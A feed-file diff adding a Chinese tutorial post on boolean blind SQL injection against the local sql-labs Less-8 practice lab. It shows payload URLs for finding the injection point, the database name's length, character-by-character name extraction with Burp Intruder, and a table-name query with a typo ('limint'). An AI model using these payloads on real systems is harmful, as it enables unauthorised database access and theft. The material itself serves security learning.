@@ -3,12 +3,114 @@
     <id>https://kiyomijin.github.io</id>
     <title>My Violet Eva Garden • Posts by &#34;sql注入探究&#34; tag</title>
     <link href="https://kiyomijin.github.io" />
-    <updated>2022-09-30T16:08:18.000Z</updated>
+    <updated>2022-09-30T17:41:34.000Z</updated>
     <category term="原创" />
     <category term="SQL注入探究" />
     <category term="数据库安全" />
     <category term="CTF小训" />
     <category term="Misc" />
+    <entry>
+        <id>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</id>
+        <title>布尔盲注</title>
+        <link rel="alternate" href="https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
+        <content type="html">&lt;h1 id=&#34;sql-注入之布尔盲注&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql-注入之布尔盲注&#34;&gt;#&lt;/a&gt; SQL 注入之布尔盲注&lt;/h1&gt;
+&lt;p&gt;本篇使用布尔盲注。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;注意&lt;/code&gt; ：盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施 SQL 注入。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;布尔盲注&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt;&lt;br&gt;
+注入的时候只会返回 &lt;code&gt;True和False&lt;/code&gt; ，所以布尔盲注就是根据页面显示的是 &lt;code&gt;True还是False&lt;/code&gt;  进行猜测数据库中的信息。&lt;/p&gt;
+&lt;p&gt;布尔盲注需要几个函数的辅助，就先来了解一下这几个函数&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;length()函数可返回字符串的长度&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;substring()函数可以截取字符串，可指定开始的位置和截取的长度&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ord()函数可以返回单个字符的ASCII码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char()函数可将ASCII码转换为对应的字符&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;具体的用法可以参考大佬的博客&lt;a href=&#34;https://www.jianshu.com/p/f0174ea6c69d&#34;&gt; Mysql 语法介绍&lt;/a&gt;，接下来就通过&lt;strong&gt; sql-labs&lt;/strong&gt; 练习布尔盲注。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;判断注入点&lt;/strong&gt;（也就是闭合符号）&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;发现输入 &lt;code&gt;id=1&#39;&lt;/code&gt;  没有错误回显&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001005755289.png&#34; alt=&#34;image-20221001005755289&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在 &lt;code&gt;id=1&#39;&lt;/code&gt;  后再加上&lt;strong&gt;注释符号&lt;/strong&gt;后又回显正确，所以判定闭合符号为 &lt;code&gt;&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001005844512.png&#34; alt=&#34;image-20221001005844512&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;爆数据库长度&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;由于我们知道  &lt;code&gt;select uname = &#39;id&#39; and 1 from xxxx&lt;/code&gt;  在 id 有效的情况下，加入 &lt;code&gt;and 1&lt;/code&gt;  不会影响整体判断&lt;/p&gt;
+&lt;p&gt;那么，这里的 1 可以被任何的查询正确的 &lt;code&gt;布尔型判断语句&lt;/code&gt; 返回结果所替代，比如 &lt;code&gt;length(database()) =x &lt;/code&gt; 就可以来代替 1 这个值。&lt;/p&gt;
+&lt;p&gt;只有当 x 等于正确的数据库长度时，才能使 &lt;code&gt;and 1 成立&lt;/code&gt; ，才能使整个查询语句回显正确的内容&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27; and length(database())=1 --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27; and length(database())=2 --+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27; and length(database())=8 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001010826646.png&#34; alt=&#34;image-20221001010826646&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001010848025.png&#34; alt=&#34;image-20221001010848025&#34;&gt;&lt;/p&gt;
+&lt;p&gt;手工注入的话就要一遍一遍的试试，将后面的长度不断增大，最后得出数据库名的长度为 &lt;code&gt;8&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;爆数据库名&lt;/strong&gt;&lt;br&gt;
+知道了数据库名的长度，接下来就来爆破数据库名&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;以这一句为基础&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27;and 1 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;继续深入构造爆破查询语句：&lt;/p&gt;
+&lt;h3 id=&#34;注入步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注入步骤&#34;&gt;#&lt;/a&gt; 注入步骤&lt;/h3&gt;
+&lt;p&gt;布尔盲注爆破数据库名&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27;and ascii(substr(database(),1,1))=1 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;然后交给&lt;strong&gt; BurpSuit&lt;/strong&gt; 抓包，选择&lt;strong&gt; Send to Intruder&lt;/strong&gt;&lt;/p&gt;
+&lt;h4 id=&#34;清空变量&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#清空变量&#34;&gt;#&lt;/a&gt; 清空变量&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001011237616.png&#34; alt=&#34;image-20221001011237616&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;设置爆破变量&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#设置爆破变量&#34;&gt;#&lt;/a&gt; 设置爆破变量&lt;/h4&gt;
+&lt;p&gt;首先我们确定好&lt;/p&gt;
+&lt;p&gt;ascii(substr(database(), &lt;code&gt;1&lt;/code&gt; ,1))= &lt;code&gt;1&lt;/code&gt;  --+ 这一句中，我标识出来的两个位置【需要我们使用工具&lt;strong&gt;爆破&lt;/strong&gt;】。&lt;/p&gt;
+&lt;p&gt;使用 Add$ 来为想要爆破的变量添加上变量符号&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001011541978.png&#34; alt=&#34;image-20221001011541978&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;选择爆破取值范围&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#选择爆破取值范围&#34;&gt;#&lt;/a&gt; 选择爆破取值范围&lt;/h4&gt;
+&lt;p&gt;第一个位置， ascii (substr (database (), &lt;code&gt;1&lt;/code&gt; ,1))=1&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001011859324.png&#34; alt=&#34;image-20221001011859324&#34;&gt;&lt;/p&gt;
+&lt;p&gt;第二个位置， ascii (substr (database (),1,1))= &lt;code&gt;1&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001012047075.png&#34; alt=&#34;image-20221001012047075&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;开始爆破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#开始爆破&#34;&gt;#&lt;/a&gt; 开始爆破&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001012115998.png&#34; alt=&#34;image-20221001012115998&#34;&gt;&lt;/p&gt;
+&lt;p&gt;由于我们的包总长度 &lt;code&gt;根据回显内容不同而发生变化&lt;/code&gt; ，因此，只有&lt;strong&gt;当取值正确的时候包长度会跟其他错误的情况不一样&lt;/strong&gt;，看下图有 8 个情况和其他次数有不一样的结果。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001012215106.png&#34; alt=&#34;image-20221001012215106&#34;&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;payload1 (数据库名第 n 个字符)&lt;/th&gt;
+&lt;th&gt;payload2 (数据库名第 n 个字符是什么字符)&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;td&gt;115–&amp;gt;‘s’&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;2&lt;/td&gt;
+&lt;td&gt;101–&amp;gt;‘e’&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;3&lt;/td&gt;
+&lt;td&gt;99  --&amp;gt;‘c’&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;4&lt;/td&gt;
+&lt;td&gt;117–&amp;gt;‘u’&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;5&lt;/td&gt;
+&lt;td&gt;114–&amp;gt;‘r’&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;6&lt;/td&gt;
+&lt;td&gt;105–&amp;gt;‘i’&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;7&lt;/td&gt;
+&lt;td&gt;116–&amp;gt;‘t’&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;8&lt;/td&gt;
+&lt;td&gt;121–&amp;gt;‘y’&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;综上，数据库名是 &lt;code&gt;security&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;爆破表名，同理&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limint 0,1),1,1))=1 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+</content>
+        <category term="SQL注入探究" />
+        <updated>2022-09-30T17:41:34.000Z</updated>
+    </entry>
     <entry>
         <id>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/</id>
         <title>双注入</title>
